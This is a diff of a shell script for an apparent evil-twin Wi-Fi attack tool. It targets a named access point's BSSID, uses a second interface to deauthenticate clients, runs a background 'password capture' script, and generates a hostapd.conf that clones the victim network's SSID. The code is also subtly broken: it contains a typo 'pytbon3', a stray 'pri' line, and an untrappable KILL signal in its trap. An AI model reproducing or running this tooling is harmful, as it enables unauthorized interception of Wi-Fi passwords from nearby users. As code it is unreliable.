@@ -3,6 +3,13 @@ red='\033[0;31m'
 green='\033[0;32m'
 yellow='\033[0;33m'
 clear_color='\033[0m'
+cleanup() {
+    printf "${red}Script terminated${clear_color}\n"
+    kill $(ps aux | grep passapi.py | grep -v grep | awk '{print $2}')
+    kill $(ps aux | grep "pytbon3 -m http.server" | grep -v grep | awk '{print $2}')
+    exit 0
+}
+trap cleanup EXIT INT ABRT KILL TERM
 print_help() {
     printf "${yellow}"
     echo 'Usage: ./init.sh -c path/to/capture/file.cap -b (target AP MAC address/BSSID) -n (network name) -i (wireless interface for AP) -d (wireless interface for deauthing target AP)'
@@ -69,4 +76,13 @@ echo "name: $name"
 echo "interface: $interface"
 echo "deauth: $deauth"
 cp $capfile $PWD/evil.cap
-python3 passapi.py $bssid
+printf "${yellow}Starting password capture script...${clear_color}\n"
+python3 passapi.py $bssid &
+pri    
+printf "${yellow}Generating hostapd.conf...${clear_color}\n"
+conf_file="$PWD/hostapd.conf"
+echo "interface=$interface" > $conf_file
+echo "driver=nl80211" >> $conf_file
+echo "ssid=$name" >> $conf_file
+printf "hw_mode=g\nchannel=3\nmacaddr_acl=0\nignore_broadcast_ssid=0\n" >> $conf_file
+
